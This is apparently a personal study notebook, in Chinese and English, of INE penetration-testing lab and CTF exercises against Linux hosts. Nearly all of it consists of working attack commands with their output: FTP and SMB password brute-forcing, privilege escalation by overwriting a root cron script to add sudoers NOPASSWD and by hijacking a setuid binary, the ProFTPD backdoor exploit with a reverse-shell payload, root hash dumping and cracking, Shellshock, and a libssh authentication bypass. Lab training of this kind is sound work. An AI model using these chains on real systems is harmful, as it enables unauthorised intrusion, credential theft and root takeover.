# Exploiting Linux Vulnerabilities
## ProFTP Recon:Basics
	=> ProFTPd 是一款開源 FTP 伺服器
		/usr/share/metasploit-framework/data/wordlists/common_users.txt
		/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://demo.ine.local

		[21][ftp] host: demo.ine.local   login: sysadmin   password: 654321                                               
		[21][ftp] host: demo.ine.local   login: rooty   password: qwerty                                                  
		[21][ftp] host: demo.ine.local   login: demo   password: butterfly                                                
		[21][ftp] host: demo.ine.local   login: auditor   password: chocolate                                             
		[21][ftp] host: demo.ine.local   login: anon   password: purple                                                   
		[21][ftp] host: demo.ine.local   login: administrator   password: tweety                                          
		[21][ftp] host: demo.ine.local   login: diag   password: tigger   
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	ftp auditor@demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	echo "sysadmin" > users
	nmap --script ftp-brute --script-args userdb=/root/users -p 21 demo.ine.local
## Samba Recon:Dictionary Attack
	nano users.txt [jane]
	msfconsole -q
		use auxiliary/scanner/smb/smb_login
		set USER_FILE users.txt
		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
		set RHOSTS demo.ine.local
		set VERBOSE false
		exploit
		
	[+] 192.162.248.3:445     - 192.162.248.3:445 - Success: '.\jane:abc123'
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://demo.ine.local
		[445][smb] host: demo.ine.local   login: admin   password: password1
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Check Permissions (R/W)
		smbmap -u admin -p password1 -H demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -p445 --script smb-enum-shares --script-args smbusername=jane,smbpassword=abc123 demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	smbclient -L demo.ine.local -U jane
		Share "jane" is not listed. Checking whether jane share exists
  
	smbclient //demo.ine.local/jane -U jane
		Share “Jane” exists but is not browsable.
	
	smbclient //demo.ine.local/admin -U admin
		get flag.tar.gz
		tar -xf flag.tar.gz
		cat flag
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use auxiliary/scanner/smb/pipe_auditor
		set SMBUser admin
		set SMBPass password1
		set RHOSTS demo.ine.local
		exploit
	[+] 192.162.248.3:139 - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	RID cycling : enum4linux -r -u admin -p password1 demo.ine.local
# Linux Privilege Escalation
## Cron Jobs Gone Wild II
	ls -l
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	找出系統中是否有同名檔案
		find / -name message 2>/dev/null
			/home/student/message
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	仔細檢查後，很明顯地該文件每分鐘都會被覆蓋
		ls -l /tmp/
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	逐一嘗試不同的目錄（即 /、etc、/opt）和 /usr 目錄時，已找到匹配項
		grep -nri "/tmp/message" /usr
	
		/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
		/usr/local/share/copy.sh:3:chmod 644 /tmp/message
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		ls -l /usr/local/share/copy.sh
		cat /usr/local/share/copy.sh
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		vim /usr/local/share/copy.sh
		vi /usr/local/share/copy.sh
		nano /usr/local/share/copy.sh
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將向/etc/sudoers檔案新增一個條目，這將允許學生使用者在不提供任何密碼的情況下使用 sudo : 
		printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		cat /usr/local/share/copy.sh
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		檢查目前的sudoers清單: 
		sudo -l
		   (root) NOPASSWD: ALL
		~~~~~~~~~~~~~~~~~~~~~~~~~~~
		sudo su
			cd /root
			ls -l
			cat flag
## Exploiting Setuid Programs
	=> https://en.wikipedia.org/wiki/Setuid
	~~~~~~~~~~~~~~~~~~~~~~~~~~~
	file welcome
		=> setuid ELF 64-bit LSB shared object
		=> 該二進位檔案及其子進程將以 root 權限運行
	~~~~~~~~~~~~~~~~~~~~~~~~~~~
	strings welcome
		=> strings 指令輸出中的問候語字串
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	=> 用其他一些二進位檔案（例如 /bin/bash）替換問候語二進位文件
		rm greetings (yes)
		cp /bin/bash greetings
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		./welcome
			whoami
			cd /root
			ls
			cat flag
# Linux Credential Dumping
## Password Cracker:Linux
	nmap -sV -sC demo.ine.local
		21/tcp open  ftp     ProFTPD 1.3.3c
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap --script vuln -p 21 demo.ine.local
		| ftp-proftpd-backdoor: 
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	/etc/init.d/postgresql start
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/unix/ftp/proftpd_133c_backdoor
		set payload payload/cmd/unix/reverse
		set RHOSTS demo.ine.local
		set LHOST 192.43.57.2
		exploit -z
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用後利用模組 system users hashes: 
		use post/linux/gather/hashdump
		set SESSION 1
		exploit
	
	[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
	[+] Unshadowed Password File: /root/.msf4/loot/20250114004246_default_192.43.57.3_linux.hashes_942517.txt
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	尋找root使用者的明文密碼
		use auxiliary/analyze/crack_linux
		set SHA512 true
		run
	
		 1      sha512crypt  root      password          Single
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Note : Auxiliary failed: NoMethodError undefined method `each' for nil:NilClass
		/etc/init.d/postgresql start

## Host & Network Penetration Testing: System-Host Based Attacks CTF 2
	=> 獲得未經授權的存取、提升權限或破壞主機的正常功能
	=> 利用未修補的軟體漏洞、錯誤配置、弱密碼和惡意軟體感染
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC target1.ine.local 
		80/tcp open  http    Apache httpd 2.4.6 ((Unix))

	http://target1.ine.local/browser.cgi
	nmap --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi" target1.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
	驗證目標是否容易受到 Shellshock 的攻擊: 
		use auxiliary/scanner/http/apache_mod_cgi_bash_env
		set RHOSTS target1.ine.local 
		set TARGETURI /browser.cgi
		run
		[+] uid=1(daemon) gid=1(daemon) groups=1(daemon)
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		use exploit/multi/http/apache_mod_cgi_bash_env_exec
		set RHOSTS target1.ine.local 
		set TARGETURI /browser.cgi
		set LHOST 192.231.119.2
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	/bin/bash -i
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC -p22 --script vuln target2.ine.local
		22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	search libssh
		auxiliary/scanner/ssh/libssh_auth_bypass 
		set RHOSTS target2.ine.local 
		set SPAWN_PTY true
		run
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		rm greetings (yes)
		cp /bin/bash greetings
		./welcome

